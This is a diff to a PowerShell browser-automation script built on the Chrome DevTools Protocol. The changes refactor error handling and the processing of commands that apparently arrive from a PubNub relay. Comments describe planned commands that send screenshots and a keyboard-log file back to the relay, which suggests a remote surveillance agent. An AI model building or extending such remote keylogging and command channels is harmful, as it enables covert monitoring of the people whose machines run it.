@@ -175,7 +175,7 @@ class PSCDPCommand {
     [int32]$id
     [string]$method
     [hashtable]$params
-    [object]$response
+    [hashtable]$response
     [string]$sessionId
     [scriptblock]$callback
     [bool]$isinvoked = $false
@@ -227,10 +227,10 @@ class PSCDPCommand {
             name=$this.name
             id=$this.id
             method=$this.method
-            params=$this.params
-            response=$this.response
+            #params=$this.params
+            response=$this.response # TODO convert response to safe hashtable before sending
             sessionId=$this.sessionId
-            callback=$this.callback
+            #callback=$this.callback
             isinvoked=$this.isinvoked
             iserror=$this.iserror
             isbroadcast=$this.isbroadcast
@@ -286,8 +286,103 @@ class PSCDPCommand {
     }
 }
 
+enum PSCDPCommandErrorType {
+    JavaScriptError
+    CDPError
+    GeneralError
+
+    <# CDPError
+    {
+    "id": 1,
+        "error": {
+            "code": -32602,
+            "message": "Invalid parameters",
+            "data": "Some missing parameter details"
+        }
+    }
+    #>
+
+    <# JavaScriptError
+        {
+            "id": 1,
+            "result": {
+                "result": {
+                    "type": "object",
+                    "subtype": "error",
+                    "className": "TypeError",
+                    "description": "TypeError: Cannot read properties of null (reading 'subtype')",
+                    "objectId": "-6633390234293888361.1.1"
+                },
+                "exceptionDetails": {
+                    "exceptionId": 1,
+                    "text": "Uncaught",
+                    "lineNumber": 0,
+                    "columnNumber": 14,
+                    "scriptId": "12",
+                    "url": "",
+                    "exception": {
+                        "type": "object",
+                        "subtype": "error",
+                        "className": "TypeError",
+                        "description": "TypeError: Cannot read properties of null (reading 'subtype')",
+                        "objectId": "-6633390234293888361.1.2"
+                    }
+                }
+            }
+        }
+    #>
+}
+
 class PSCDPResponse {
 
+    [PSCDPCommandErrorType]$errorType = $null
+
+    [bool]$iserror = $false
+    [int32]$id = -1
+    [hashtable]$result = @{}
+    [hashtable]$errorht = @{}
+
+    static [PSCDPCommandErrorType] GetErrorType([hashtable]$msght) {
+
+        $errtype = $null
+
+        try {
+
+            if ( $msght.ContainsKey('error') ) {
+                $iserror = $true
+                throw ""
+            }
+
+            if ( ! $msg.ContainsKey('result') ) {
+                throw ""
+            }
+    
+            if ( ! [string]::IsNullOrEmpty($msg.result.exceptionDetails.exceptionId) ) {
+                $iserror = $true
+                throw ""
+            }
+    
+            # javascript error
+            if ( $msg.result.result.subtype -eq "error" ) {
+                $iserror = $true
+                throw ""
+            }
+    
+        } catch {
+            
+        }
+
+        return [PSCDPCommandErrorType]::GeneralError
+    }
+    
+    static [PSCDPResponse] Create([hashtable]$msght) {
+        [PSCDPResponse]$obj = @{}
+
+        $obj.id = $msght['id']
+        $obj.result = $msght['result']
+
+        return $obj
+    }
 }
 
 # TODO what happens to $this.targets when target is destroyed
@@ -508,9 +603,28 @@ $script:evaluate_callback = {
         targetId=$target.targetId
     }
 
-    $resltstr = $Response.result.result.value
+    $resltstr = ""
+
+    try {
+        if ( ! $cmd.iserror ) {
+            $resltstr = $Response.result.result.value
+        } else {
+            $obj = $Response.result.exceptionDetails
+            $obj = Transform-PSCustomObject($obj)
+
+            $ht = @{ 
+                description=$Response.result.result.description
+                exceptionDetails=$obj
+            }
+
+            $resltstr = $ht | ConvertTo-Json
+        }
+    } catch {
+        $resltstr = "FATA SYSTEM ERROR"
+    }
     
-    if ( [string]::IsNullOrEmpty($resltstr) ) {
+    
+    if ( $null -eq $resltstr ) {
         $resltstr=""
     }
 
@@ -598,7 +712,7 @@ function Transform-PSCustomObject($obj) {
             $ht[$_.Name] = $_.Value
         }
     } catch {
-
+        $ht = $null
     }
     
     return $ht;
@@ -641,37 +755,8 @@ function Process-CDP {
     return $ret
 }
 
-# executes builtincmd
-function Process-PubNubEvent {
-
-    param([string]$Message)
-
-    try {
-        $payload = $Message | ConvertFrom-Json # should have cmdid, etc.
-
-        if ( $payload.message.source -eq "pscdp.relay.ps1" ) {
-            return
-        }
-    
-    } catch {
-
-    }
-
-    $isbuiltincmd = $false
-    $cmd = $null
-
-    try {
-        if ( ! [string]::IsNullOrEmpty($payload.message.builtincmd) ) {
-            $isbuiltincmd = $true
-            $cmd = $payload.message
-        }
-    } catch {
-
-    }
-
-    if ( ! $isbuiltincmd -and $null -ne $cmd ) {
-        return
-    }
+function Process-BuiltInCommand {
+    param([object]$cmd)
 
     $resultout = @{
         builtincmd=$cmd.builtincmd
@@ -785,7 +870,7 @@ function Process-PubNubEvent {
         }
         
     } else {
-        throw "unsupported command"
+        throw "unsupported command [$($cmd.builtincmd)]"
     }
 
     $resultout['result'] = $result
@@ -794,6 +879,36 @@ function Process-PubNubEvent {
 
     # GetScreenshot  --> send back image as base64 string --> requires chunking
     # GetKeyboardLog --> send back owdkeyboardlog.txt file --> might also require chunking
+}
+
+# executes builtincmd
+function Process-PubNubEvent {
+
+    param([string]$Message)
+
+    try {
+        $payload = $Message | ConvertFrom-Json # should have cmdid, etc.
+
+        if ( $payload.message.source -eq "pscdp.relay.ps1" ) {
+            return
+        } elseif ( $payload.type -eq "PubNubStatus" ) {
+            return
+        }
+    
+    } catch {
+
+    }
+
+    $cmd = $null
+
+    if ( ! [string]::IsNullOrEmpty($payload.message.builtincmd) ) {
+        $cmd = $payload.message
+
+        if ( $null -ne $cmd ) {
+            Process-BuiltInCommand($cmd)
+        }
+    }
+
 }
 
 function Ping-DebugPort {
@@ -1198,16 +1313,16 @@ class PSCDP {
                 throw ""
             }
     
-            if ( $msg.result.result.subtype -eq "error" ) {
-                $iserror = $true
-                throw ""
-            }
-    
             if ( ! [string]::IsNullOrEmpty($msg.result.exceptionDetails.exceptionId) ) {
                 $iserror = $true
                 throw ""
             }
     
+            # javascript error
+            if ( $msg.result.result.subtype -eq "error" ) {
+                $iserror = $true
+                throw ""
+            }
     
         } catch {
             
@@ -1239,11 +1354,17 @@ class PSCDP {
             return
         }
 
-        $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResponse
+        try {
+            $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResponse
+        } catch {
+            Log-Msg $_ # TODO refactor to report exception
+            return
+        }
         
         $iserror = $false
         $isresult = $false
-        $attachedToTarget = $false # Target.attachedToTarget
+
+        $attachedToTarget = $false
         $targetCreated = $false
         $targetDestroyed = $false
         $bindingCalled = $false
@@ -1251,9 +1372,10 @@ class PSCDP {
         $executionContextCreated = $false
         $executionContextDestroyed = $false
         $executionContextsCleared = $false
+
         $sessionId = $null
 
-        try { $sessionId = $msg.params.sessionId } catch { }
+        try { $sessionId = $msg.params.sessionId } catch { } # notifications don't have an ID field
 
         $msght = @{}
         $msg.psobject.Properties | ForEach-Object {
@@ -1297,10 +1419,12 @@ class PSCDP {
 
         # check if msg is a response to an issued cmd
         if ( $isresult ) {
-            $cmd = $this.GetCommandByID($msg.id) # $this.commands | Where-Object { $id -eq $msg.result.id } | Select-Object -First 1 
-        
+            $cmd = $this.GetCommandByID($msg.id)
+            
+            # convert msght to PSCDPResponse before attaching
+
             if ( $null -ne $cmd ) {
-                $cmd.response = $msght
+                $cmd.response = [PSCDPResponse]::Create($msght) # anchor
                 $cmd.iserror = $iserror
             }
 
@@ -1309,14 +1433,13 @@ class PSCDP {
             $this.results.Add($msght)
         }
 
-        # TODO needs error checking to ensure objects have properties being accessed
         if ( $bindingCalled ) {
-            if ( $msght['params'].name -eq "onPubNubEvent" ) { # $msght['params'].payload
+            if ( $msght['params'].name -eq "onPubNubEvent" ) {
                 Log-Msg "processing incomming PubNub event"
                 $this.pubnubmsgs.Add($msght)
                 $payload = $msght['params'].payload
                 Process-PubNubEvent -Message $payload
-            } # $pubnubmsg
+            } 
         }
 
         if ( $consoleAPICalled ) {
@@ -1593,8 +1716,7 @@ while ( $true ) {
             Log-Msg $_
         }
     } catch {
-        Write-Error $($_.Exception.Message)
-        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
+        Log-Msg $_
 
         $script:pubnubws.Reset()
         $script:pubnubws.ConnectCdp()
